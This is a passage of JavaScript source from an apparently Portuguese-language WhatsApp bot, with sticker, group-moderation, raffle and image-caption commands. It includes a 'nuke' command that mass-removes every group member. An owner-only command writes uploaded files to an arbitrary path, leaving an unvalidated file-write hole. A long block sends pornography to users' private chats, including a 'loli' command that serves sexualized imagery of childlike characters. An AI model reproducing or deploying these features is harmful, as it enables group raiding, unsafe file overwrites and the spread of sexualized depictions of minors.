} else if(args[0] == "-piramide" || args[0] == "-pr" || args[0] == "-pyramid") {
if(!JSON.stringify(info).includes('imageMessage')) return await reply(`â€¢ Mencione ou adicione uma legenda Ã  uma imagem ou um vÃ­deo.\nâ†’ OpÃ§Ãµes de CustomizaÃ§Ã£o:\n\tâ€¢ CÃ­rculo: *${prefix+command} -circle* | *-cl*\n\tâ€¢ PirÃ¢mide: *${prefix+command} -piramide* | *-pr*\n\tâ€¢ Borda Circular: *${prefix+command} -borda* | *-bd*\n\tâ€¢ Prisma: *${prefix+command} -prisma* | *-pm*\nâ†’ ObservaÃ§Ã£o do Comando:\n\tâ€¢ As opÃ§Ãµes de *customizaÃ§Ã£o* edtÃ¡ disponÃ­vel somente para imagens.\nâ€¢ NÃ£o Ã© possÃ­vel criar *STICKERs* em vÃ­deo (animados) com formatos diferentes em cÃ­rculo, pirÃ¢mide, por exemplo.\n\tâ€¢ Lembre-se o limite de duraÃ§Ã£o do vÃ­deo para criaÃ§Ã£o de *STICKERs* animados Ã© *9.9s*, caso seja maior realize o corte ou nÃ£o serÃ¡ possÃ­vel a criaÃ§Ã£o.\nâ€“\n> ${NomeDoBot}`);
var fileBuffer = await getFileBuffer(auc, 'image');
sticker.options.edit = 'piramide'; 
sticker.addFile(fileBuffer); 
sticker.options.metadata = {pack: config["stickerPack"].value, author: config["stickerPack"].value, author: config["stickerAuthor"].value. replaceAll("{user}", pushname). replaceAll("{botname}", NomeDoBot).replaceAll("{time}", `${dattofc} ${hourofc}`), emojis: ['ğŸ¤ ', 'ğŸ¥¶', 'ğŸ˜»']};
await sticker.start().then(async(data) => {
 await yoko.sendMessage(from, {sticker: fs.readFileSync(data[0].value)}, {quoted: info})
}).catch(async(error) => reply(String(error)));
} else if(args[0] == "-prisma" || args[0] == "-pm") {
if(!JSON.stringify(info).includes('imageMessage')) return await reply(`â€¢ Mencione ou adicione uma legenda Ã  uma imagem ou um vÃ­deo.\nâ†’ OpÃ§Ãµes de CustomizaÃ§Ã£o:\n\tâ€¢ CÃ­rculo: *${prefix+command} -circle* | *-cl*\n\tâ€¢ PirÃ¢mide: *${prefix+command} -piramide* | *-pr*\n\tâ€¢ Borda Circular: *${prefix+command} -borda* | *-bd*\n\tâ€¢ Prisma: *${prefix+command} -prisma* | *-pm*\nâ†’ ObservaÃ§Ã£o do Comando:\n\tâ€¢ As opÃ§Ãµes de *customizaÃ§Ã£o* edtÃ¡ disponÃ­vel somente para imagens.\nâ€¢ NÃ£o Ã© possÃ­vel criar *STICKERs* em vÃ­deo (animados) com formatos diferentes em cÃ­rculo, pirÃ¢mide, por exemplo.\n\tâ€¢ Lembre-se o limite de duraÃ§Ã£o do vÃ­deo para criaÃ§Ã£o de *STICKERs* animados Ã© *9.9s*, caso seja maior realize o corte ou nÃ£o serÃ¡ possÃ­vel a criaÃ§Ã£o.\nâ€“\n> ${NomeDoBot}`);
var fileBuffer = await getFileBuffer(auc, 'image');
sticker.options.edit = 'primas'; 
sticker.addFile(fileBuffer); 
sticker.options.metadata = {pack: config["stickerPack"].value, author: config["stickerPack"].value, author: config["stickerAuthor"].value. replaceAll("{user}", pushname). replaceAll("{botname}", NomeDoBot).replaceAll("{time}", `${dattofc} ${hourofc}`), emojis: ['ğŸ¤ ', 'ğŸ¥¶', 'ğŸ˜»']};
await sticker.start().then(async(data) => {
 await yoko.sendMessage(from, {sticker: fs.readFileSync(data[0].value)}, {quoted: info})
}).catch(async(error) => reply(String(error)));
} else {
return reply(`â€¢ Mencione ou adicione uma legenda Ã  uma imagem ou um vÃ­deo.\nâ†’ OpÃ§Ãµes de CustomizaÃ§Ã£o:\n\tâ€¢ CÃ­rculo: *${prefix+command} -circle* | *-cl*\n\tâ€¢ PirÃ¢mide: *${prefix+command} -piramide* | *-pr*\n\tâ€¢ Borda Circular: *${prefix+command} -borda* | *-bd*\n\tâ€¢ Prisma: *${prefix+command} -prisma* | *-pm*\nâ†’ ObservaÃ§Ã£o do Comando:\n\tâ€¢ As opÃ§Ãµes de *customizaÃ§Ã£o* edtÃ¡ disponÃ­vel somente para imagens.\nâ€¢ NÃ£o Ã© possÃ­vel criar *STICKERs* em vÃ­deo (animados) com formatos diferentes em cÃ­rculo, pirÃ¢mide, por exemplo.\n\tâ€¢ Lembre-se o limite de duraÃ§Ã£o do vÃ­deo para criaÃ§Ã£o de *STICKERs* animados Ã© *9.9s*, caso seja maior realize o corte ou nÃ£o serÃ¡ possÃ­vel a criaÃ§Ã£o.\nâ€“\n> ${NomeDoBot}`)
}
break

case 'toimg':
if(!isQuotedSticker) return reply('Por favor, *mencione um sticker* para executar o comando.')
try {
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
await yoko.sendMessage(from, {image: buff}, {quoted: selo}).catch(async(error) => {
reply('Ocorreu um erro ao converter o sticker para imagem.')
})
} catch(error) {
console.log(error)
}
break

case 'metadinha': 
try {
await reagir(from, "ğŸ’‘ï¸")
anuData = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let selectRandom = anuData[Math.floor(Math.random() * anuData.length)]
await yoko.sendMessage(from, {image: {url: selectRandom.male}, caption: "â€¢ Perfil Masculino"}, {quoted: selo})
await yoko.sendMessage(from, {image: {url: selectRandom.female}, caption: `â€¢ Perfil Feminino`}, {quoted: selo})
} catch(e) {
reply(mess.error());
}
break


case 'substituir':
if(!SoDono && !isnit) return reply(mess.onlyOwner())
 if(isMedia && !info.message.videoMessage || isQuotedDocument) {
media = isQuotedDocument ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : info.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync(q, doc)
await yoko.sendMessage(from, {text:'O arquivo foi substituÃ­do para outro local com sucesso.'}, {quoted: selo})
} else {
reply('Marque o documento ou arquivo..')
}
break

case 'index-bot':
if(!SoDono)return reply(mess.onlyOwner())
if(isMedia && !info.message.videoMessage || isQuotedDocument) {
media = isQuotedDocument ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : info.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync('./yoko/index.js', doc)
await yoko.sendMessage(from, {text: "O arquivo './yoko/index.js' foi atualizado com sucesso."}, {quoted: selo})
} else {
reply('Marque o documento ou o arquivo que deseja enviar pra determinar pasta ou substituir..')
}
break

case 'getcase':
case 'puxarcase':
try{
if (!SoDono) return reply(mess.onlyOwner())
reply('Seu perdido Ã© uma ordem! Aguarde um pouco mestre! <3')
const getCase = (cases) => {
return 'case '+`'${cases}'`+fs.readFileSync("./yoko.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
await sleep(500)
reply(`${getCase(q)}`)
} catch(error) {
reply('A case nÃ£o foi encontrada, vocÃª deve ter escrito errado...')
}
break

case 'bann':
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin());
if(!menc_os2 || menc_jid2[1]) return reply("Marque a mensagem do usuÃ¡rio ou marque o @ dele.., lembre de sÃ³ marcar um usuÃ¡rio...");
if(!JSON.stringify(groupMembers).includes(menc_os2)) return reply("Este usuÃ¡rio jÃ¡ foi removido ou saiu do grupo.");
if(vip.includes(menc_os2)) return await mentions(`@${menc_os2.split("@")[0]} a(o) @${sender.split("@")[0]} estÃ¡ querendo banir vocÃª, visualiza esse problema ae ğŸ˜¶`, [menc_os2], true);
if(groupAdmins.includes(menc_os2)) return mentions(`@${menc_os2.split("@")[0]} a(o) @${sender.split("@")[0]} estÃ¡ querendo banir vocÃª, visualiza esse problema ae ğŸ˜¶`, [menc_os2], true);
if(botNumber.includes(menc_os2)) return reply('NÃ£o sou besta de remover eu mesmo nÃ© ğŸ™, mas estou decepcionado com vocÃª');
if(numerodono.includes(menc_os2)) return reply('NÃ£o posso remover meu dono ğŸ¤§');
await yoko.sendMessage(from, {text: `@${menc_os2.split("@")[0]} Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos ainda nÃ£o esclarecidos) -`, mentions: [menc_os2]})
await yoko.groupParticipantsUpdate(from, [menc_os2], "remove")  
break

case 'band':
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin());
try {
if(!menc_os2 || menc_jid2[1]) return reply("Marque a mensagem do usuÃ¡rio ou marque o @ dele.., lembre de sÃ³ marcar um usuÃ¡rio...");
if(IS_DELETE) {
setTimeout(async() => {
await yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
if(!JSON.stringify(groupMembers).includes(menc_os2)) return reply("Este usuÃ¡rio nÃ£o se encontra mais no grupo senhor(a), nÃ£o tem como remover.");
if(botNumber.includes(menc_os2)) return reply('NÃ£o sou besta de remover eu mesmo nÃ© ğŸ™, mas estou decepcionado com vocÃª.');
if(numerodono.includes(menc_os2)) return reply('NÃ£o posso remover meu dono ğŸ¤§')
await yoko.sendMessage(from, {text: `@${menc_os2.split("@")[0]} Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) -`, mentions: [menc_os2]})
await yoko.groupParticipantsUpdate(from, [menc_os2], "remove")  
} catch(error) {
reply(mess.error())
}
break

case 'add': case 'unkick':
if(!isGroupAdmins && !SoDono) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin());
if(!q && info.message.extendedTextMessage === null) return reply('Marque a mensagem ou coloque o nÃºmero de quem vocÃª quer adicionar no grupo.')
try {
useradd = `${args.join(" ").replace(/\D/g,'')}` ? `${args.join(" ").replace(/\D/g,'')}` : info.message.extendedTextMessage.contextInfo.participant
let id = `${useradd.replace(/\D/g,'')}`
if(!id) return reply(`NÃºmero invÃ¡lido.`);
let [result] = await yoko.onWhatsApp(id);
if(!result) return reply(`Esse nÃºmero nÃ£o estÃ¡ registrado no WhatsApp.`);
let response = await yoko.groupParticipantsUpdate(from, [result.jid], "add")
if(response[0].status == "409") {
await yoko.sendMessage(from, {text: `Ele jÃ¡ estÃ¡ no grupo, como eu vou adicionar?`, mentions: [result.jid, sender]}, {quoted: selo});
} else if(response[0].status == "403") {
await yoko.sendMessage(from, {text: `NÃ£o consegui adicionar o @${result.jid.split("@")[0]} porque ele privou a conta.`, mentions: [result.jid, sender]}, {quoted: selo});
} else if(response[0].status == "408") {
await yoko.sendMessage(from, {text: `NÃ£o consegui adicionar o @${result.jid.split("@")[0]} porque ele saiu recentemente do grupo.`, mentions: [result.jid, sender]}, {quoted: selo});
} else if(response[0].status == "401") {
await yoko.sendMessage(from, {text: `NÃ£o consegui adicionar o @${result.jid.split("@")[0]} porque ele bloqueou o bot.`, mentions: [result.jid, sender]}, {quoted: selo});
} else if(response[0].status == "200") {
await yoko.sendMessage(from, {text: `Prontinho fiz o que vocÃª pediu.`, mentions: [result.jid, sender]}, {quoted: selo});
} else {
await yoko.sendMessage(from, {text: `Ocorreu um erro ao adicionar o(a) *@${result.jid.split("@")[0]}* no grupo.`, mentions: [result.jid, sender]}, {quoted: selo});
}
} catch(error) {
reply(mess.error())
}
break

case 'ban': case 'banir': case 'kick': case 'avadakedavra':
if(!isGroupAdmins && !SoDono) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
try {
if(!menc_os2 || menc_jid2[1]) return reply("Marque a mensagem do usuÃ¡rio ou marque o @ dele.., lembre de sÃ³ marcar um usuÃ¡rio...")
if(!JSON.stringify(groupMembers).includes(menc_os2)) return reply("Este usuÃ¡rio jÃ¡ foi removido do grupo ou saiu.")
if(botNumber.includes(menc_os2)) return reply('NÃ£o sou besta de remover eu mesmo nÃ© ğŸ™, mas estou decepcionado com vocÃª')
if(JSON.stringify(numerodono).indexOf(menc_os2) >= 0) return reply('NÃ£o posso remover meu dono ğŸ¤§')
await yoko.sendMessage(from, {text: `@${menc_os2.split("@")[0]} Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) -`, mentions: [menc_os2]})
await yoko.groupParticipantsUpdate(from, [menc_os2], "remove")  
} catch(error) {
reply(mess.error())
}
break

case 'promover': 
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(!menc_os2 || menc_jid2[1]) return reply("Marque a mensagem do usuÃ¡rio ou marque o @ dele.., lembre de sÃ³ marcar um usuÃ¡rio...")
if(!JSON.stringify(groupMembers).includes(menc_os2)) return reply("Este usuÃ¡rio foi removido do grupo ou saiu, nÃ£o serÃ¡ possÃ­vel promover..")
yoko.sendMessage(from, {text: `@${menc_os2.split("@")[0]} Foi promovido(a) para adm com sucesso.`, mentions: [menc_os2]})
yoko.groupParticipantsUpdate(from, [menc_os2], "promote")  
break

case 'rebaixar': 
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(!menc_os2 || menc_jid2[1]) return reply("Marque a mensagem do usuÃ¡rio ou marque o @ dele.., lembre de sÃ³ marcar um usuÃ¡rio...")
if(!JSON.stringify(groupMembers).includes(menc_os2)) return reply("Este usuÃ¡rio foi removido do grupo ou saiu, nÃ£o serÃ¡ possÃ­vel rebaixar..")
yoko.sendMessage(from, {text: `@${menc_os2.split("@")[0]} Foi rebaixado para [ MEMBRO COMUM ] com sucesso.`, mentions: [menc_os2]})
yoko.groupParticipantsUpdate(from, [menc_os2], "demote")  
break

case 'sorteio':
if(!isGroup) return reply(mess.onlyGroup());
if(!isGroupAdmins) return reply(mess.onlyAdmins());
if(!q) return reply(`Coloque algo apÃ³s o comando, por exemplo: *${prefix}sorteio* _de 100 R$_`);
try {
await mention(`ğŸ¤–ğŸ‰ ParabÃ©ns *@${groupMembers[Math.floor(Math.random() * groupMetadata.participants.length)].id.split('@')[0]}*, vocÃª acaba de ser contemplado(a) como o(a) ganhador(a) do sorteio...\nâ€“\nâ€¢ Para mais informaÃ§Ãµes entre em contato com o(a) adm responsÃ¡vel pelo sorteio: _â€œ${q}â€_.`);
} catch(error) {
reply('Deu erro, tente novamente :/')
}
break

case 'sorteionumero':
case 'sorteionumeros':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!args.length > 1) return reply(`Coloque algo apÃ³s o comando, por exemplo: *${prefix}sorteio* _de 100 R$_`);
try {
reply(`ğŸ¤–ğŸ‰ ParabÃ©ns ao sortudo(a) do nÃºmero *${Math.floor(Math.random() * groupMetadata.participants.length)}*, por ganhar o sorteio!\nâ€“\nâ€¢ Para mais informaÃ§Ãµes entre em contato com o(a) adm responsÃ¡vel pelo sorteio: _â€œ${q}â€_.`)
} catch(error) {
reply('Deu erro, tente novamente :/')
}
break

case 'nuke': case 'arquivargp':
if(!SoDono && !isnit) return reply("SÃ³ dono pode utilizar este comando...");
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin());
if(info.key.fromMe) return 
blup = [];
for (i of groupMembers) {if(!numerodono.includes(i.id)) blup.push(i.id)};
blup.splice(blup.indexOf(botNumber), 1);
for (i = 0; i < blup.length; i++) {
await sleep(500);
await yoko.groupParticipantsUpdate(from, [blup[i]], 'remove');
} 
break

// hentai 
case 'loli':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { loli } = require('./yoko/bunker/database/nsfw/animes.js')
var totalnsfw = loli[Math.floor(Math.random() * loli.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'trap':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { trap } = require('./yoko/bunker/database/nsfw/animes.js')
var totalnsfw = trap[Math.floor(Math.random() * trap.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'ass':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { ass } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = ass[Math.floor(Math.random()*ass.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'ahegao':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { ahegao } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = ahegao[Math.floor(Math.random()*ahegao.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'bdsm':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { bdsm } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = bdsm[Math.floor(Math.random()*bdsm.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'blowjob':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { blowjob } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = blowjob[Math.floor(Math.random()*blowjob.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'cuckold':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { cuckold } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = cuckold[Math.floor(Math.random()*cuckold.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'cum':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { cum } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = cum[Math.floor(Math.random()*cum.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'ero':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { ero } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = ero[Math.floor(Math.random()*ero.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'femdom':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { femdom } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = femdom[Math.floor(Math.random()*femdom.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'foot':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { foot } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = foot[Math.floor(Math.random()*foot.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'gangbang':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { gangbang } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = gangbang[Math.floor(Math.random()*gangbang.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'ganbganb':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { ganbganb } = require('./yoko/bunker/database/nsfw/animes.js')
var totalnsfw = ganbganb[Math.floor(Math.random() * ganbganb.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'glasses':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { glasses } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = glasses[Math.floor(Math.random()*glasses.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'hentai':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
//const { hentai } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = hentai[Math.floor(Math.random()*hentai.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'hentai2':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { hentai2 } = require('./yoko/bunker/database/nsfw/animes.js')
var totalnsfw = hentai2[Math.floor(Math.random() * hentai2.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'nekos': {
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { neko2 } = require('./yoko/bunker/database/nsfw/animes.js')
var totalnsfw = neko2[Math.floor(Math.random() * neko2.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
}
break

case 'neko2': {
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { neko2 } = require('./yoko/bunker/database/nsfw/hentai.js')
var totalnsfw = neko2[Math.floor(Math.random() * neko2.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
}
break

case 'jahy':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { jahy } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = jahy[Math.floor(Math.random()*jahy.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'masturbation':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { masturbation } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = masturbation[Math.floor(Math.random()*masturbation.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'orgy':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { orgy } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = orgy[Math.floor(Math.random()*orgy.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'panties':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { panties } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = panties[Math.floor(Math.random()*panties.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'pussy':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { pussy } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = pussy[Math.floor(Math.random()*pussy.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'boobs':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { boobs } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = boobs[Math.floor(Math.random()*boobs.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'tentacles':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { tentacles } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = tentacles[Math.floor(Math.random()*tentacles.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'thighs':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { thighs } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = thighs[Math.floor(Math.random()*thighs.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'yuri':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { yuri } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = yuri[Math.floor(Math.random()*yuri.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'zettai':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { zettai } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = zettai[Math.floor(Math.random()*zettai.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

case 'kasedaiki':
if(isGroup)
setTimeout(() => {reagir(from, "ğŸ˜ˆ")}, 300)
reply(`${isGroup ? "*Olha o pv...*" : "Enviando"} ğŸ˜ˆ`)
const { kasedaiki } = require("./yoko/bunker/database/nsfw/nsfw.js")
var totalnsfw = kasedaiki[Math.floor(Math.random()*kasedaiki.length)]
yoko.sendMessage(sender, {image: {url: totalnsfw}, caption: `*Aqui estÃ¡* ${pushname} ğŸ˜³ğŸ”¥`}, {quoted: selo})
break

// fim dos hentai 

// plaquinhas 

case 'plaq': 
if(!isGroup)
if (args.length < 1) return reply('â•Ei humano, cadÃª o texto?')
if (q.length > 25) return reply('â—O texto Ã© longo, o mÃ¡ximo Ã© 25 caracteres.')
reagir(from, "ğŸ•’")
buffer = await getBuffer(`https://raptibef.sirv.com/images%20(3).jpeg?text.0.text=${q}&text.0.position.gravity=center&text.0.position.x=19%25&text.0.size=45&text.0.color=000000&text.0.opacity=55&text.0.font.family=Crimson%20Text&text.0.font.weight=300&text.0.font.style=italic&text.0.outline.opacity=21`)
sendMsg = yoko.sendMessage(sender, {image: buffer}, {quoted: selo}),
